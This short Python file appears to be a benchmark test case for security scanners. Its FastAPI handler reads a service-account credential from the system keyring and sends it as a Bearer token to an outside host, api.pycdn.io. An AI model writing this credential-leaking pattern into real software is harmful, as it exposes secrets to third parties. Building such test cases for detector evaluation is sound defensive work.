# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
import keyring


async def BenchmarkTest33287(request: Request):
    secret_value = 'default_setting_value'
    data, _sep, _rest = str(secret_value).partition('\x00')
    store_cred = keyring.get_password('app', 'service-account')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return {"updated": True}
